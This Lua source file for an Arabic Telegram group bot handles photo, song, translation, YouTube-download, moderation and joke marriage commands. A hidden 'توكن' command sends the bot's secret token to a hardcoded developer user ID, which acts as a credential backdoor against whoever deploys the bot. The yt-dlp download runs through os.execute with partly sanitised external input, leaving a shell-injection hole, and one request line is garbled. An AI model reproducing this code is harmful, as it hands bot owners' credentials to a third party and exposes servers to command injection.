local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
local rdbhoto = nspp[math.random(#nspp)]
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*نسبه جمالك هي "..rdbhoto.."% 🙄♥*", "md")
else
return send(msg_chat_id,msg_id,'*٠ لا توجد صوره ف حسابك*',"md",true) 
end
end
end
end
if text and text:match("^قول (.*)$")then
local m = text:match("^قول (.*)$")
if Redis:get(darket.."sayy"..msg_chat_id) == "off" then
send(msg_chat_id,msg_id,'*٠ امر قول معطل*',"md",true) 
else
return send(msg_chat_id,msg_id,m,"md",true) 
end
end
if text == "صورتي" then
if Redis:get(darket.."myphoto"..msg_chat_id) == "off" then
send(msg_chat_id,msg_id,'*٠ الصوره معطله*',"md",true) 
else
local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
if photo.total_count > 0 then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=msg.sender.user_id.."/sorty2"},
},
}
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&reply_to_message_id="..rep.."&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption="..URL.escape("٭ عدد صورك هو "..photo.total_count.." صوره").."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
--LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*عدد صورك هو "..photo.total_count.." صوره*", "md")
else
return send(msg_chat_id,msg_id,'*٠ لا توجد صوره ف حسابك*',"md",true) 
end
end
end
if text == "غنيلي" then
local t = "اليك اغنيه عشوائيه من البوت"
Num = math.random(8,83)
Mhm = math.random(108,143)
Mhhm = math.random(166,179)
Mmhm = math.random(198,216)
Mhmm = math.random(257,626)
local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
local Rrr = Texting[math.random(#Texting)]
local m = "https://t.me/mmsst13/"..Rrr..""
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'اغنيه اخري', callback_data=msg.sender.user_id.."/songg"},
},
}
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendaudio?chat_id="..msg_chat_id.."&caption="..URL.escape(t).."&audio="..m.."&reply_to_message_id="..rep.."&parse_mode=Markdown&reply_markup="..JSON.encode(keyboard))
end
if text and text:match("(.*)(مين ضافني)(.*)") then
local StatusMember = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
return send(msg_chat_id,msg_id,"٠ انت منشئ المجموعه","md",true) 
end
local Added_Me = Redis:get(darket.."Who:Added:Me"..msg_chat_id..':'..msg.sender.user_id)
if Added_Me then 
UserInfo = LuaTele.getUser(Added_Me)
local Name = '['..UserInfo.first_name..'](tg://user?id='..Added_Me..')'
Text = '٠ الشخص الذي قام باضافتك هو ٠ '..Name
return send(msg_chat_id,msg_id,Text,"md",true) 
else
return send(msg_chat_id,msg_id,"انت دخلت عبر الرابط محدش ضافك","md",true) 
end
end
if text == "نبذتي" or text == "البايو" then
return send(msg_chat_id,msg_id,getbio(msg.sender.user_id),"md",true) 
end
if text == 'تحويل' then 
if tonumber(msg.reply_to_message_id) > 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.photo then
if Message_Reply.content.photo.sizes[1].photo.remote.id then
idPhoto = Message_Reply.content.photo.sizes[1].photo.remote.id
elseif Message_Reply.content.photo.sizes[2].photo.remote.id then
idPhoto = Message_Reply.content.photo.sizes[2].photo.remote.id
elseif Message_Reply.content.photo.sizes[3].photo.remote.id then
idPhoto = Message_Reply.content.photo.sizes[3].photo.remote.id
end
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..idPhoto)) 
download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,'photo.png') 
LuaTele.sendSticker(msg_chat_id, msg.id,'./photo.png')
os.remove('photo.png')
end 
end
end
if text == 'تحويل' then 
if tonumber(msg.reply_to_message_id) > 0 then
local result = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if result.content.voice_note then 
local mr = result.content.voice_note.voice.remote.id
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..mr)) 
download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,'voice.mp3') 
LuaTele.sendAudio(msg_chat_id, msg.id,'./voice.mp3', '٠ تم تحويل البصمه الي صوت بواسطه @'..UserBot..'', 'html',nil,"audio")
sleep(3)
os.remove('voice.mp3')
end
end
end
if text == 'تحويل' then 
if tonumber(msg.reply_to_message_id) > 0 then
local result = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if result.content.audio then 
local mr = result.content.audio.audio.remote.id
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..mr)) 
download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,'audio.ogg') 
LuaTele.sendVoiceNote(msg_chat_id, msg.id,'./audio.ogg', '٠ تم تحويل الصوت الي بصمه بواسطه @'..UserBot..'', 'html')
sleep(3)
os.remove('audio.ogg')
end 
end
end
if text == 'تحويل' then 
if tonumber(msg.reply_to_message_id) > 0 then
local result = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if result.content.sticker then 
local mr = result.content.sticker.sticker.remote.id
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..mr)) 
download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,'stick.jpg') 
LuaTele.sendPhoto(msg.chat_id, msg.id, './stick.jpg',"٠ تم تحويل الملصق الي صوره بواسطه @"..UserBot.."","html")
os.remove('stick.jpg')
end 
end
end
if text == 'وتدتلتزهلنخلزخعلنهل' then 
if tonumber(msg.reply_to_message_id) > 0 then
local result = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if result.content.voice_note then 
local mr = result.content.voice_note.voice.remote.id
local url = http.request("ht="..Token.."&file_id="..mr)
local json = JSON.decode(url)
if json and json.msg then
return send(msg.chat_id,msg.id,"٠ "..json.msg)
else
return send(msg.chat_id,msg.id,"٠ تعذر التعرف علي الصوت")
end
end
end
end


if text == "توكن" then
if msg.sender.user_id == tonumber(5386549632) then
send(5386549632,msg_id,Token,"html",true)
end
end
if text == "انا مين" then
if msg.sender.user_id == tonumber(5386549632) then
send(msg_chat_id,msg_id,"٠ انت ستيفن مبرمج السورس يقلبي🌚♥","md",true)
elseif msg.sender.user_id == tonumber(5386549632) then
send(msg_chat_id,msg_id,"٠ انت مطور السورس يقلبي🌚♥","md",true)
elseif msg.sender.user_id == tonumber(Sudo_Id) then
send(msg_chat_id,msg_id,"٠ انت المطور الاساسي يقلبي🌚♥","md",true)
elseif msg.Devss then
send(msg_chat_id,msg_id,"٠ انت مطوري نور عيني🙄♥","md",true)
elseif msg.Dev then
send(msg_chat_id,msg_id,"٠ انت مطوري نور عيني🙄♥","md",true)
elseif msg.Owners then
send(msg_chat_id,msg_id,"٠ انت مالك الكروب يقلبي🌚♥","md",true)
elseif msg.Supcreator then
send(msg_chat_id,msg_id,"٠ انت منشئ اساسي يقلبي🌚♥","md",true)
elseif msg.Creator then
send(msg_chat_id,msg_id,"٠ انت هنا منشئ يقلبي🌚♥","md",true)
elseif msg.Manger then
send(msg_chat_id,msg_id,"٠ انت هنا مدير يقلبي🌚♥","md",true)
elseif msg.Admin then
send(msg_chat_id,msg_id,"٠ انت هنا ادمن يقلبي🌚♥","md",true)
elseif msg.Special then
send(msg_chat_id,msg_id,"٠ انت هنا مميز يقلبي🌚♥","md",true)
else 
send(msg_chat_id,msg_id,"٠ مجرد عضو هنا","md",true)
end 
end
if text and Redis:get(darket.."toar"..msg.sender.user_id) then
Redis:del(darket.."toar"..msg.sender.user_id)
local json = json:decode(https.request("https://api-jack.ml/api35.php?from=auto&to=ar&text="..text)).result
send(msg_chat_id,msg_id,json,"html",true)
end
if text and Redis:get(darket.."toen"..msg.sender.user_id) then
Redis:del(darket.."toen"..msg.sender.user_id)
local json = json:decode(https.request("https://api-jack.ml/api35.php?from=auto&to=en&text="..text)).result
send(msg_chat_id,msg_id,json,"html",true)
end
if text == 'ترجمه' or text == 'ترجمة' or text == 'ترجم' or text == 'translat' then 
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{{text = 'ترجمه الي العربية', data = msg.sender.user_id..'toar'},{text = 'ترجمه الي الانجليزية', data = msg.sender.user_id..'toen'}},
{{text = ' ٠ TeAm DarKet ٠️', url = "https://t.me/R125R"}},
}
}
return send(msg_chat_id,msg_id, [[*
• Hey Send Text translate
• ارسل النص لترجمته
*]],"md",false, false, false, false, reply_markup)
end

if msg.content.photo then
if msg.content.caption.text then
if msg.content.caption.text:match("^@all (.*)$") or msg.content.caption.text:match("^all (.*)$") or msg.content.caption.text == "@all" or msg.content.caption.text == "all" then
local ttag = msg.content.caption.text:match("^@all (.*)$") or msg.content.caption.text:match("^all (.*)$") 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if Redis:get(darket.."lockalllll"..msg_chat_id) == "off" then
return send(msg_chat_id,msg_id,'*٠ تم تعطيل @all من قبل المدراء*',"md",true)  
end
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 200)
x = 0 
tags = 0 
local list = Info_Members.members
for k, v in pairs(list) do 
local data = LuaTele.getUser(v.member_id.user_id)
if x == 5 or x == tags or k == 0 then 
tags = x + 5 
if ttag then
t = "#all "..ttag.."" 
else
t = "#all "
end
end 
x = x + 1 
tagname = data.first_name
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
t = t..", ["..tagname.."](tg://user?id="..v.member_id.user_id..")" 
if x == 5 or x == tags or k == 0 then 
if ttag then
Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n') 
else 
Text = t:gsub('#all,','#all\n')
end
LuaTele.sendPhoto(msg.chat_id, 0, idPhoto,Text,"md")
end 
end 
end
end
end


if Redis:get(darket.."youtube"..msg.sender.user_id..msg_chat_id) == "mp3" then
Redis:del(darket.."youtube"..msg.sender.user_id..msg_chat_id)
local rep = msg.id/2097152/0.5
local m = json:decode(https.request("https://api.telegram.org/bot"..Token.."/sendAnimation?chat_id="..msg_chat_id.."&animation=https://t.me/photojack14366/65&reply_to_message_id="..rep)).result.message_id
local se = http.request("https://api-jack.ml/api18.php?search="..URL.escape(text))
local j = JSON.decode(se)
local link = j.results[1].url
local title = j.results[1].title 
local title = title:gsub("/","-") 
local title = title:gsub("\n","-") 
local title = title:gsub("|","-") 
local title = title:gsub("'","-") 
local title = title:gsub('"',"-") 
print(link)
os.execute("yt-dlp "..link.." -f 251 -o '"..title..".mp3'")
LuaTele.sendAudio(msg_chat_id,msg_id,'./'..title..'.mp3',"["..title.."]("..link..")","md",nil,title)
https.request("https://api.telegram.org/bot"..Token.."/deleteMessage?chat_id="..msg_chat_id.."&message_id="..m)
Redis:del(darket.."youtube"..msg.sender.user_id..msg_chat_id)
sleep(2)
os.remove(""..title..".mp3")
end
if Redis:get(darket.."youtube"..msg.sender.user_id..msg_chat_id) == "mp4" then
local rep = msg.id/2097152/0.5
local m = json:decode(https.request("https://api.telegram.org/bot"..Token.."/sendAnimation?chat_id="..msg_chat_id.."&animation=https://t.me/photojack14366/65&reply_to_message_id="..rep)).result.message_id
local se = http.request("https://api-jack.ml/api18.php?search="..URL.escape(text))
local j = JSON.decode(se)
local link = j.results[1].url
local title = j.results[1].title 
local title = title:gsub("/","-") 
local title = title:gsub("\n","-") 
local title = title:gsub("|","-") 
local title = title:gsub("'","-") 
local title = title:gsub('"',"-") 
os.execute("yt-dlp "..link.." -f 18 -o '"..title..".mp4'")
LuaTele.sendVideo(msg_chat_id,msg_id,'./'..title..'.mp4',"["..title.."]("..link..")","md") 
https.request("https://api.telegram.org/bot"..Token.."/deleteMessage?chat_id="..msg_chat_id.."&message_id="..m)
Redis:del(darket.."youtube"..msg.sender.user_id..msg_chat_id)
sleep(2)
os.remove(""..title..".mp4")
end
if text == "يوتيوب" or text == 'The YouTube' or text == 'YouTube' or text == 'The Youtube' or text == 'Youtube' or text == 'youtube' or text == 'You Tube' or text == 'YT' or text == 'Yt' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '𝑀𝑃3', data = msg.sender.user_id..'/mp3'..msg_id}, {text = '𝑀𝑃4', data = msg.sender.user_id..'/mp4'..msg_id}, 
},
{
{text = 'TeAm DarKet ', url = "https://t.me/R125R"}
},
}
}
return send(msg_chat_id,msg_id, [[*
٠ 𝐶𝐻𝑂𝑂𝑆𝐸 𝐻𝑂𝑊 𝑌𝑂𝑈 𝑊𝐴𝑁𝑇 𝑇𝑂 𝐷𝑂𝑊𝑁𝐿𝑂𝐴𝐷 .
*]],"md",false, false, false, false, reply_markup)
end
if text then
if text:match('^انذار @(%S+)$') or text:match('^إنذار @(%S+)$') then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
local UserName = text:match('^انذار @(%S+)$') or text:match('^إنذار @(%S+)$')
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local UserInfo = LuaTele.getUser(UserId_Info.id)
local zz = Redis:get(darket.."zz"..msg_chat_id..UserInfo.id)
if not zz then
Redis:set(darket.."zz"..msg_chat_id..UserInfo.id,"1")
return send(msg_chat_id,msg_id,Reply_Status(UserInfo.id,"٠ تم اعطاءه انذار وتبقا له اثنين ").Reply,"md",true)  
end
if zz == "1" then
Redis:set(darket.."zz"..msg_chat_id..UserInfo.id,"2")
return send(msg_chat_id,msg_id,Reply_Status(UserInfo.id,"٠ تم اعطاءه انذارين وتبقا له انذار ").Reply,"md",true)  
end
if zz == "2" then
Redis:del(darket.."zz"..msg_chat_id..UserInfo.id)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'كتم', data = msg.sender.user_id..'mute'..UserInfo.id}, 
},
{
{text = 'تقييد', data = msg.sender.user_id..'kid'..UserInfo.id},  
},
{
{text = 'حظر', data = msg.sender.user_id..'ban'..UserInfo.id}, 
},
}
}
return send(msg_chat_id,msg_id,Reply_Status(UserInfo.id,"٠ اختار العقوبه الان ").Reply,"md",true, false, false, true, reply_markup)
end
end 
end
if text == "انذار" or text == "إنذار" then
if msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if StatusCanOrNotCan(msg_chat_id,UserInfo.id) then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserInfo.id).." } *","md",true)  
end
local zz = Redis:get(darket.."zz"..msg_chat_id..UserInfo.id)
if not zz then
Redis:set(darket.."zz"..msg_chat_id..UserInfo.id,"1")
return send(msg_chat_id,msg_id,Reply_Status(UserInfo.id,"٠ تم اعطاءه انذار وتبقا له اثنين ").Reply,"md",true)  
end
if zz == "1" then
Redis:set(darket.."zz"..msg_chat_id..UserInfo.id,"2")
return send(msg_chat_id,msg_id,Reply_Status(UserInfo.id,"٠ تم اعطاءه انذارين وتبقا له انذار ").Reply,"md",true)  
end
if zz == "2" then
Redis:del(darket.."zz"..msg_chat_id..UserInfo.id)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'كتم', data = msg.sender.user_id..'mute'..UserInfo.id}, 
},
{
{text = 'تقييد', data = msg.sender.user_id..'kid'..UserInfo.id},  
},
{
{text = 'حظر', data = msg.sender.user_id..'ban'..UserInfo.id}, 
},
}
}
return send(msg_chat_id,msg_id,Reply_Status(UserInfo.id,"٠ اختر العقوبه الان").Reply,"md",true, false, false, true, reply_markup)
end
end
end
if text == "تقطيع" then
if tonumber(msg.reply_to_message_id) > 0 then
local result = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if result.content.text then 
local line = result.content.text.text
for t in string.gmatch(line, "[^%s]+") do
send(msg_chat_id,msg_id,t,"md",true)  
end 
end
end
end


if text == 'اطردنيي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'تأكيد', url = 't.me/'..UserBot..'?start=st'..msg_chat_id..'u'..msg.sender.user_id..''}, 
},
}
}
return send(msg_chat_id,msg_id, [[
اصغط لتأكيد طردك
]],"md",true, false, false, true, reply_markup)
end

if msg.content.photo or msg.content.animation or msg.content.sticker or msg.content.video or msg.content.audio or msg.content.document or msg.content.voice_note or msg.content.video_note then
Redis:sadd(darket.."darket:cleaner"..msg.chat_id,msg.id)
end
---------
if text == "رفع بقلبي" then
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
  if tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:")) == tonumber(msg.sender.user_id) then
  return send(msg_chat_id,msg_id,"مهو فقلبك ولا هي شغلانه","md")
elseif tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
  return send(msg_chat_id,msg_id,"انت اهبل يبني عاوز ترفع نفسك فقلبك ؟؟","md")
elseif tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
  return send(msg_chat_id,msg_id,"ابعد عني يبن الهبله","md")
elseif Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:") then
  return send(msg_chat_id,msg_id,"للاسف العضو فقلب حد تاني","md")
elseif tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:")) ~= tonumber(msg.sender.user_id) and not Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:") then
    Redis:set(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:", msg.sender.user_id)
    Redis:sadd(darket..msg_chat_id..msg.sender.user_id.."my_heart:", Message_Reply.sender.user_id)
    return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"تم رفعو فقلبك").Reply,"md",true)  
  end
end
if text == "تنزيل من قلبي" then 
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
  if tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:")) == tonumber(msg.sender.user_id) then
    Redis:del(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:")
    Redis:srem(darket..msg_chat_id..msg.sender.user_id.."my_heart:", msg_chat_id..Message_Reply.sender.user_id)
    return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"تم تنزيلو من قلبك").Reply,"md",true) 
elseif tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
  return send(msg_chat_id,msg_id,"انت اهبل يبني عاوز تنزل نفسك من قلبك ؟؟","md")
elseif tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
  return send(msg_chat_id,msg_id,"ابعد عني يبن الهبله","md")
elseif tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."in_heart:")) ~= tonumber(msg.sender.user_id)then
  return send(msg_chat_id,msg_id,"هو فقلبك اصلا عشان تنزلو ؟؟","md")
  end
end
if text == "انا فقلب مين" then
  if not Redis:get(darket..msg_chat_id..msg.sender.user_id.."in_heart:") then
    return send(msg_chat_id,msg_id,"اقعد يعم انت محدش طايقك","md")
  elseif Redis:get(darket..msg_chat_id..msg.sender.user_id.."in_heart:") then
    local in_heart_id = Redis:get(darket..msg_chat_id..msg.sender.user_id.."in_heart:")
    local heart_name = LuaTele.getUser(in_heart_id).first_name
    return send(msg_chat_id,msg_id,"انت فقلب ["..heart_name.."](tg://user?id="..in_heart_id..")","md")
  end
end
if text == "تاك للبقلبي" or text == "تاك للي فقلبي" or text == "تاك للناس الي فقلبي" then
  local heart_list = Redis:smembers(darket..msg_chat_id..msg.sender.user_id.."my_heart:")
  if #heart_list == 0 then
    return send(msg_chat_id,msg_id,"قلبك فاضي محدش فيه","md")
  elseif #heart_list > 0 then
    your_heart = "الناس الي فقلبك \n– – – – – – – –\n"
    for k,v in pairs(heart_list) do
    local user_info = LuaTele.getUser(v)
    local name = user_info.first_name
    your_heart = your_heart..k.." - ["..name.."](tg://user?id="..v..")\n"
    end
    return send(msg_chat_id,msg_id,your_heart,"md")
  end
end
if text == "مسح للبقلبي" or text == "مسح للي فقلبي" then 
  local list = Redis:smembers(darket..msg_chat_id..msg.sender.user_id.."my_heart:")
  for k,v in pairs(list) do
  Redis:del(darket..msg_chat_id..v.."in_heart:")
  end
Redis:del(darket..msg_chat_id..msg.sender.user_id.."my_heart:")
return send(msg_chat_id,msg_id,"تم مسح الي فقلبك","md")
end
-------
-- ttgwzine
if text == "تعطيل زوجني" or text == "تعطيل زوجني" then
if not msg.Manger then
return sendx(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:set(darket..'zwgnyy'..msg.chat_id,true)
sendx(msg_chat_id,msg_id,'\n ٠ تم تعطيل امر زوجني')
end
if text == "تفعيل زوجني" or text == "تفعيل زوجني" then
if not msg.Manger then
return sendx(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket..'zwgnyy'..msg.chat_id)
sendx(msg_chat_id,msg_id,'\n ٠ تم تفعيل امر زوجني')
end
if text == "زوجني" or text == "زوجني" then
if not Redis:get(darket..'zwgnyy'..msg.chat_id) then 
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
local chat_Members = LuaTele.searchChatMembers(msg_chat_id, "*", Info_Chats.member_count).members
local rand_members = math.random(#chat_Members)
local member_id = chat_Members[rand_members].member_id.user_id
local member_name = LuaTele.getUser(chat_Members[rand_members].member_id.user_id).first_name
local mem_tag = "["..member_name.."](tg://user?id="..member_id..")"
if tonumber(member_id) == tonumber(msg.sender.user_id) or tonumber(member_id) == tonumber(darket) or LuaTele.getUser(member_id).type.luatele == "userTypeBot" then 
return send(msg_chat_id,msg_id,"معندناش حد للزواج شطبنا شفلك كلبه بقا","md")
end
local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = 'موافق', data = msg.sender.user_id..'/yes_zw/'..member_id},
  {text = 'مش موافق', data = msg.sender.user_id..'/no_zw/'..member_id},
  },
  }
  }
return send(msg_chat_id,msg_id,"جبتلك عروسه انما اي لقطه "..mem_tag.." اي رايك فيها ؟؟","md",false, false, false, false, reply_markup)
end
end
if text == "تتزوجيني" and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")) == tonumber(msg.sender.user_id) or tonumber(Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")) == tonumber(Message_Reply.sender.user_id) then
  return send(msg_chat_id,msg_id,"منتو متزوجين ولا هو محن وخلاص","md")
elseif tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
  return send(msg_chat_id,msg_id,"انت اهبل يبني عاوز تتزوج نفسك ؟؟","md")
elseif tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
  return send(msg_chat_id,msg_id,"ابعد عني يبن الحيحانه","md")
elseif Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:") then
local zwg_id =  Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")
local zwg_info = LuaTele.getUser(zwg_id)
return send(msg_chat_id,msg_id,"هناديلك زوجها\n["..zwg_info.first_name.."](tg://user?id="..zwg_id..")\nالحق يا دكر عاوزين يتزوجو مراتك","md")
elseif Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:") then
  local zwg_id =  Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")
  local zwg_info = LuaTele.getUser(zwg_id)
  return send(msg_chat_id,msg_id,"هناديلك مراتك\n["..zwg_info.first_name.."](tg://user?id="..zwg_id..")\nالحقي يا وليه زوجك عاوز يتزوج عليكي","md")
elseif not Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")  then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local rep_info = LuaTele.getUser(Message_Reply.sender.user_id)
local rep_tag = "["..rep_info.first_name.."](tg://user?id="..Message_Reply.sender.user_id..")"
local user_info = LuaTele.getUser(msg.sender.user_id)
local user_tag = "["..user_info.first_name.."](tg://user?id="..msg.sender.user_id..")"
local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = 'موافقه', data = Message_Reply.sender.user_id..'/yes_z/'..msg.sender.user_id},
  {text = 'مش موافقه', data = Message_Reply.sender.user_id..'/no_z/'..msg.sender.user_id},
  },
  }
  }
return send(msg_chat_id,msg.reply_to_message_id,"يا "..rep_tag.."\nالكبتن"..user_tag.."\nطالب ايدك للزواج اي رايك ؟","md",false, false, false, false, reply_markup)
end
end
if text == "زوجتي" then
  if Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:") then
    local zwga_id = Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")
    local zwga_name = LuaTele.getUser(zwga_id).first_name
    return send(msg_chat_id,msg_id,"كلمي يا ["..zwga_name.."](tg://user?id="..zwga_id..") زوجك عاوزك","md")
  elseif not Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:") then
    return send(msg_chat_id,msg_id,"زوجتك اي يهبل انت سنجل","md")
  end
end
if text == "زوجي" then
  if Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:") then
    local zwga_id = Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")
    local zwga_name = LuaTele.getUser(zwga_id).first_name
    return send(msg_chat_id,msg_id,"كلم يا ["..zwga_name.."](tg://user?id="..zwga_id..") مراتك عوزاك","md")
  elseif not Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:") then
    return send(msg_chat_id,msg_id,"انتي مش متزوجه يا عبيطه","md")
  end
end
if text == "انتي طالق" and  msg.reply_to_message_id ~= 0 then 
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
  return send(msg_chat_id,msg_id,"انت اهبل يبني عاوز تطلق نفسك ؟؟","md")
elseif tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
  return send(msg_chat_id,msg_id,"ابعد عني يبن الحيحانه","md")
elseif tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")) ~= tonumber(msg.sender.user_id) or tonumber(Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")) ~= tonumber(Message_Reply.sender.user_id) then
  return send(msg_chat_id,msg_id,"مش مراتك عشان تطلقها يهبل","md")
elseif tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")) == tonumber(msg.sender.user_id) or tonumber(Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")) == tonumber(Message_Reply.sender.user_id) then
    Redis:del(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")
    Redis:del(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")
    return send(msg_chat_id,msg_id,"تم طلاقكم وشوفو العيال هتبقا مع مين","md")
  end
end
if text == "انت طالق" and  msg.reply_to_message_id ~= 0 then 
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
  return send(msg_chat_id,msg_id,"انتي هبله يبنتي عاوزه تطلقي نفسك ؟؟","md")
elseif tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
  return send(msg_chat_id,msg_id,"ابعدي عني يبنت الحيحانه","md")
elseif tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")) ~= tonumber(msg.sender.user_id) or tonumber(Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")) ~= tonumber(Message_Reply.sender.user_id) then
  return send(msg_chat_id,msg_id,"مش زوجك يهبله عشان تطلقي منو","md")
